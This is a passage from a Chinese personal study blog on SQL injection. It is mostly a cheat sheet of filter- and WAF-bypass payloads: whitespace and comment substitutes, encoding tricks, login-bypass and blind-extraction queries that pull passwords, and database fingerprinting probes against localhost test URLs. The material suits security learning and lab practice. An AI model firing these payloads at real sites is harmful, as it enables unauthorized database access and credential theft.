<h3 id="空格被过滤"><a href="#空格被过滤" class="headerlink" title="空格被过滤"></a>空格被过滤</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/**/替代空格</span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">09 TAB 键（水平）</span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">0a 新建一行</span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">0c 新的一页</span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">0d <span class="built_in">return</span> 功能</span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">0b TAB 键（垂直）</span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">a0 空格</span></span><br><span class="line">() 代替空格，在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>%a0是一个不成汉字的中文字符，因此正则匹配时不会当空格过滤，而进入sql语句后，mysql不认中文字符，当空格处理</p>
</blockquote>
<h3 id="过滤单引号"><a href="#过滤单引号" class="headerlink" title="过滤单引号"></a>过滤单引号</h3><p>转义符号及注释没被过滤时，将username闭合的单引号转义，在password的输入中插入布尔盲注语句</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>admin\</span><br><span class="line">password<span class="operator">=</span><span class="keyword">or</span> <span class="number">2</span><span class="operator">&gt;</span><span class="number">1</span>#</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin\&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27; or 2&gt;1#&#x27;</span>;</span><br></pre></td></tr></table></figure></div>

<h4 id="多种注释符"><a href="#多种注释符" class="headerlink" title="多种注释符"></a>多种注释符</h4><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span></span><br><span class="line"><span class="comment">--%20</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line">#</span><br><span class="line"><span class="comment">--+</span></span><br><span class="line"><span class="comment">-- -</span></span><br><span class="line"><span class="operator">%</span><span class="number">00</span></span><br><span class="line">;</span><br><span class="line">;<span class="operator">%</span><span class="number">00</span></span><br><span class="line">;\x00</span><br></pre></td></tr></table></figure></div>

<h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><ul>
<li><p>大小写绕过</p>
</li>
<li><p>双写绕过（主要用于源码中使用replace替换黑名单）</p>
</li>
<li><p>编码绕过</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>即<span class="operator">%</span><span class="number">6</span>f<span class="operator">%</span><span class="number">72</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">31</span><span class="operator">%</span><span class="number">3</span>d<span class="operator">%</span><span class="number">31</span>，而Test也可以为<span class="type">CHAR</span>(<span class="number">101</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">97</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">115</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">116</span>)。</span><br><span class="line"></span><br><span class="line">十六进制编码</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span>(extractvalue(<span class="number">0x3C613E61646D696E3C2F613E</span>,<span class="number">0x2f61</span>))</span><br><span class="line"></span><br><span class="line">双重编码绕过</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a<span class="operator">*</span><span class="operator">/</span><span class="keyword">UNION</span><span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a <span class="operator">/</span><span class="keyword">SELECT</span><span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a<span class="operator">*</span><span class="operator">/</span><span class="number">1</span>,<span class="number">2</span>,password<span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a<span class="operator">*</span><span class="operator">/</span><span class="keyword">FROM</span><span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a<span class="operator">*</span><span class="operator">/</span>Users<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">一些unicode编码举例：    </span><br><span class="line">单引号：<span class="string">&#x27;</span></span><br><span class="line"><span class="string">%u0027 %u02b9 %u02bc</span></span><br><span class="line"><span class="string">%u02c8 %u2032</span></span><br><span class="line"><span class="string">%uff07 %c0%27</span></span><br><span class="line"><span class="string">%c0%a7 %e0%80%a7</span></span><br><span class="line"><span class="string">空白：</span></span><br><span class="line"><span class="string">%u0020 %uff00</span></span><br><span class="line"><span class="string">%c0%20 %c0%a0 %e0%80%a0</span></span><br><span class="line"><span class="string">左括号(:</span></span><br><span class="line"><span class="string">%u0028 %uff08</span></span><br><span class="line"><span class="string">%c0%28 %c0%a8</span></span><br><span class="line"><span class="string">%e0%80%a8</span></span><br><span class="line"><span class="string">右括号):</span></span><br><span class="line"><span class="string">%u0029 %uff09</span></span><br><span class="line"><span class="string">%c0%29 %c0%a9</span></span><br><span class="line"><span class="string">%e0%80%a9</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>like绕过</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;?id=1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span> <span class="keyword">like</span> <span class="number">1</span>#</span><br><span class="line">可绕过对<span class="operator">=</span> <span class="operator">&gt;</span>等过滤</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>in绕过</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">in</span> (<span class="string">&#x27;1234&#x27;</span>)#</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>in可以代替’&#x3D;’，只有两个字符串一模一样时才返回true，注意括号不能漏，否则报错</p>
</blockquote>
</li>
<li><p>过滤union</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">waf<span class="operator">=</span> <span class="string">&#x27;and|or|union&#x27;</span></span><br><span class="line">绕过方式 <span class="number">1</span><span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">where</span> userid)<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>过滤where</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">waf <span class="operator">=</span> <span class="string">&#x27;and|or|union|where&#x27;</span></span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users limit <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>过滤limit</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">waf <span class="operator">=</span> <span class="string">&#x27;and|or|union|where|limit&#x27;</span></span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">group</span> <span class="keyword">by</span> user_id <span class="keyword">having</span> user_id <span class="operator">=</span> <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span>#user_id聚合中user_id为<span class="number">1</span>的<span class="keyword">user</span>为admim</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>过滤group by</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">waf <span class="operator">=</span> <span class="string">&#x27;and|or|union|where|limit|group by&#x27;</span></span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> substr(group_concat(user_id),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">user</span> <span class="keyword">from</span> users ) <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>过滤select</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">waf <span class="operator">=</span> <span class="string">&#x27;and|or|union|where|limit|group by|select&#x27;</span></span><br><span class="line">只能查询本表中的数据</span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> substr(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;a&#x27;</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。</p>
</blockquote>
</li>
<li><p>过滤’(单引号)</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">waf <span class="operator">=</span> <span class="string">&#x27;and|or|union|where|limit|group by|select|\&#x27;&#x27;</span></span><br><span class="line"><span class="string">过滤代码 1 &amp;&amp; substr(user,1,1) = &#x27;</span>a<span class="string">&#x27;</span></span><br><span class="line"><span class="string">绕过方式 1 &amp;&amp; user_id is not null    1 &amp;&amp; substr(user,1,1) = 0x61    1 &amp;&amp; substr(user,1,1) = unhex(61)</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>过滤hex</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">waf <span class="operator">=</span> <span class="string">&#x27;and|or|union|where|limit|group by|select|\&#x27;</span><span class="operator">|</span>hex<span class="string">&#x27;</span></span><br><span class="line"><span class="string">过滤代码 1 &amp;&amp; substr(user,1,1) = unhex(61)</span></span><br><span class="line"><span class="string">绕过方式 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>过滤substr</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">waf <span class="operator">=</span> <span class="string">&#x27;and|or|union|where|limit|group by|select|\&#x27;</span><span class="operator">|</span>hex<span class="operator">|</span>substr<span class="string">&#x27;</span></span><br><span class="line"><span class="string">过滤代码 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) </span></span><br><span class="line"><span class="string">绕过方式 1 &amp;&amp; lpad(user(),1,1) in &#x27;</span>r<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>过滤逗号</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>过滤了逗号怎么办？就不能多个参数了吗？</span><br><span class="line"><span class="keyword">SELECT</span> SUBSTR(<span class="string">&#x27;2018-08-17&#x27;</span>,<span class="number">6</span>,<span class="number">5</span>);与<span class="keyword">SELECT</span> SUBSTR(<span class="string">&#x27;2018-08-17&#x27;</span> <span class="keyword">FROM</span> <span class="number">6</span> <span class="keyword">FOR</span> <span class="number">5</span>);</span><br><span class="line">意思相同</span><br><span class="line">substr支持这样的语法：</span><br><span class="line"><span class="built_in">SUBSTRING</span>(str <span class="keyword">FROM</span> pos <span class="keyword">FOR</span> len)</span><br><span class="line"><span class="built_in">SUBSTRING</span>(str <span class="keyword">FROM</span> pos)</span><br><span class="line">MID()后续加入了这种写法</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="等价函数或变量"><a href="#等价函数或变量" class="headerlink" title="等价函数或变量"></a>等价函数或变量</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">hex()、bin() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> ascii()</span><br><span class="line">sleep() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>benchmark()</span><br><span class="line">concat_ws()<span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>group_concat()</span><br><span class="line">mid()、substr() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="built_in">substring</span>()</span><br><span class="line">@<span class="variable">@user</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="keyword">user</span>()</span><br><span class="line">@<span class="variable">@datadir</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> datadir()</span><br><span class="line"> </span><br><span class="line">举例：<span class="built_in">substring</span>()和substr()无法使用时：?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(<span class="built_in">lower</span>(mid((<span class="keyword">select</span> pwd <span class="keyword">from</span> users limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">=</span><span class="number">74</span>　</span><br><span class="line"> </span><br><span class="line">或者：</span><br><span class="line">substr((<span class="keyword">select</span> <span class="string">&#x27;password&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="number">0x70</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x69</span>) <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x70</span>) <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x71</span>) <span class="operator">=</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure></div>

<h4 id="反引号绕过"><a href="#反引号绕过" class="headerlink" title="反引号绕过"></a>反引号绕过</h4><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> `version()`  可以用来过空格和正则，特殊情况下还可以当作注释符用</span><br></pre></td></tr></table></figure></div>

<h1 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h1><h3 id="前端与数据库类型"><a href="#前端与数据库类型" class="headerlink" title="前端与数据库类型"></a>前端与数据库类型</h3><p>asp：SQL Server，Access<br>.net：SQL Server<br>php：MySQL，<a class="link"   target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=PostgreSQL&spm=1001.2101.3001.7020" >PostgreSQL <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>java：Oracle，MySQL</p>
<h2 id="根据特有函数判断"><a href="#根据特有函数判断" class="headerlink" title="根据特有函数判断"></a>根据特有函数判断</h2><h3 id="len和length"><a href="#len和length" class="headerlink" title="len和length"></a>len和length</h3><p><code>len()</code>：SQL Server 、MySQL以及db2返回长度的函数。<br><code>length()</code>：Oracle和INFORMIX返回长度的函数。</p>
<h3 id="version和-version"><a href="#version和-version" class="headerlink" title="version和@@version"></a>version和@@version</h3><p><code>version()</code>：MySQL查询版本信息的函数<br><code>@@version</code>：MySQL和SQL Server查询版本信息的函数</p>
<h3 id="substring和substr"><a href="#substring和substr" class="headerlink" title="substring和substr"></a>substring和substr</h3><p>MySQL两个函数都可以使用<br>Oracle只可调用substr<br>SQL Server只可调用substring</p>
<h3 id="根据特殊符号进行判断"><a href="#根据特殊符号进行判断" class="headerlink" title="根据特殊符号进行判断"></a>根据特殊符号进行判断</h3><p>&#x2F;*是MySQL数据库的注释符<br>–是Oracle和SQL Server支持的注释符<br>;是子句查询标识符，Oracle不支持多行查询，若返回错误，则说明可能是Oracle数据库<br>#是MySQL中的注释符，返回错误则说明可能不是MySQL，另外MySQL也支持– 和&#x2F;**&#x2F;</p>
<h3 id="根据数据库对字符串的处理方式判断"><a href="#根据数据库对字符串的处理方式判断" class="headerlink" title="根据数据库对字符串的处理方式判断"></a>根据数据库对字符串的处理方式判断</h3><p>MySQL<br><a class="link"   target="_blank" rel="noopener" href="http://127.0.0.1/test.php?id=1" >http://127.0.0.1/test.php?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and ‘a’+’b’&#x3D;’ab’<br><a class="link"   target="_blank" rel="noopener" href="http://127.0.0.1/test.php?id=1" >http://127.0.0.1/test.php?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and CONCAT(‘a’,’b’)&#x3D;’ab’<br>Oracle<br><a class="link"   target="_blank" rel="noopener" href="http://127.0.0.1/test.php?id=1" >http://127.0.0.1/test.php?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and ‘a’||’b’&#x3D;’ab’<br><a class="link"   target="_blank" rel="noopener" href="http://127.0.0.1/test.php?id=1" >http://127.0.0.1/test.php?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and CONCAT(‘a’,’b’)&#x3D;’ab’<br>SQL Server<br><a class="link"   target="_blank" rel="noopener" href="http://127.0.0.1/test.php?id=1" >http://127.0.0.1/test.php?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and ‘a’+’b’&#x3D;’ab’ </p>
<h3 id="根据数据库特有的数据表来判断"><a href="#根据数据库特有的数据表来判断" class="headerlink" title="根据数据库特有的数据表来判断"></a>根据数据库特有的数据表来判断</h3><p>MySQL（version&gt;5.0）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1 and (select count(*) from information_schema.TABLES)&gt;0 and 1=1</span><br></pre></td></tr></table></figure></div>

<p>Oracle</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1 and (select count(*) from sys.user_tables)&gt;0 and 1=1</span><br></pre></td></tr></table></figure></div>

<p>SQL Server</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1 and (select count(*) from sysobjects)&gt;0 and 1=1</span><br></pre></td></tr></table></figure></div>

<h3 id="根据盲注特别函数判断"><a href="#根据盲注特别函数判断" class="headerlink" title="根据盲注特别函数判断"></a>根据盲注特别函数判断</h3><p>MySQL</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BENCHMARK(1000000,ENCODE(&#x27;QWE&#x27;,&#x27;ASD&#x27;))</span><br><span class="line">SLEEP(5)</span><br></pre></td></tr></table></figure></div>


<p>PostgreSQL</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PG_SLEEP(5)</span><br><span class="line">GENERATE_SERIES(1,1000000)</span><br></pre></td></tr></table></figure></div>


<p>SQL Server</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WAITFOR DELAY &#x27;0:0:5&#x27;</span><br></pre></td></tr></table></figure></div>

<p>⚠️待补充 <a class="link"   target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/261524.html" >珂技系列之一篇就够了——mysql注入 - FreeBuf网络安全行业门户 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>[对MYSQL注入相关内容及部分Trick的归类小结 - 先知社区 (aliyun.com)](</p>

        </div>

        
            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                <div class="article-copyright-info-container">
    <ul>
        <li><strong>标题:</strong> sql注入学习</li>
        <li><strong>作者:</strong> Sl0th</li>
        <li><strong>创建于
                :</strong> 2022-01-23 22:20:06</li>
        
            <li>
                <strong>更新于
                    :</strong> 2024-11-11 18:23:06
            </li>
        
        <li>
            <strong>链接:</strong> http://sl0th.top/2022/01/23/sql注入学习/
        </li>
        <li>
            <strong>
                版权声明:
            </strong>
            

            
                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
            
        </li>
    </ul>
</div>

            </div>
        

        
            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
                
                    <li class="tag-item mx-0.5">
                        <a href="/tags/web/">#web</a>&nbsp;
                    </li>
                
                    <li class="tag-item mx-0.5">
                        <a href="/tags/mysql/">#mysql</a>&nbsp;
                    </li>
                
                    <li class="tag-item mx-0.5">
                        <a href="/tags/php/">#php</a>&nbsp;
                    </li>
                
                    <li class="tag-item mx-0.5">
                        <a href="/tags/sql/">#sql</a>&nbsp;
                    </li>
                
            </ul>
        

        

        
            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                
                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="prev"
                        rel="prev"
                        href="/2022/03/04/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"
                        >
                            <span class="left arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-left"></i>
                            </span>
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">文件上传</span>
                                <span class="post-nav-item">上一篇</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="next"
                        rel="next"
                        href="/2022/01/20/php%E5%88%A9%E7%94%A8math%E5%87%BD%E6%95%B0rce%E7%9B%B8%E5%85%B3%E6%80%9D%E8%80%83%E4%B8%8E%E7%90%86%E8%A7%A3/"
                        >
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">php利用math函数rce相关思考与理解</span>
                                <span class="post-nav-item">下一篇</span>
                            </span>
                            <span class="right arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        


        
            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
                <div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        评论
    </div>
    

        
            
    <div id="waline"></div>
    <script type="module" data-swup-reload-script>
      import { init } from '/js/libs/waline.mjs';

      function loadWaline() {
        init({
          el: '#waline',
          serverURL: 'https://example.example.com',
          lang: 'zh-CN',
          dark: 'body[class~="dark-mode"]',
          reaction: false,
          requiredMeta: ['nick', 'mail'],
          emoji: [],
          
          
        });
      }

      if (typeof swup !== 'undefined') {
        loadWaline();
      } else {
        window.addEventListener('DOMContentLoaded', loadWaline);
      }
    </script>



        
    
</div>

            </div>
        
    </div>

    
        <div class="toc-content-container">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <div class="toc-title">目录</div>
        <div class="page-title">sql注入学习</div>
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="nav-text">SQL注入原理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%AE%9A%E4%B9%89"><span class="nav-text">一、定义</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E5%AE%9E%E4%BE%8B%E5%8F%8A%E5%8E%9F%E7%90%86"><span class="nav-text">二、实例及原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5-dvwa%E5%B9%B3%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E7%AE%80%E5%8D%95%E7%BA%A7%E5%88%AB"><span class="nav-text">2.1字符型注入(dvwa平台sql注入简单级别)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E5%BA%93%E5%90%8D"><span class="nav-text">获取所有库名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-%E6%95%B4%E6%95%B0%E5%9E%8B%E6%B3%A8%E5%85%A5-CTFHub%E6%8A%80%E8%83%BD%E6%A0%91"><span class="nav-text">2.2 整数型注入(CTFHub技能树)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-SQL%E7%9B%B2%E6%B3%A8"><span class="nav-text">2.3 SQL盲注</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="nav-text">三、判断注入点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-text">3.1判断是否存在SQL注入漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2%E5%88%A4%E6%96%AD%E6%98%AF%E5%AD%97%E7%AC%A6%E5%9E%8B%E8%BF%98%E6%98%AF%E6%95%B4%E6%95%B0%E5%9E%8B"><span class="nav-text">3.2判断是字符型还是整数型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3%E5%88%A4%E6%96%AD%E8%83%BD%E5%90%A6%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-text">3.3判断能否时间盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-4%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B"><span class="nav-text">3.4判断数据库类型</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span 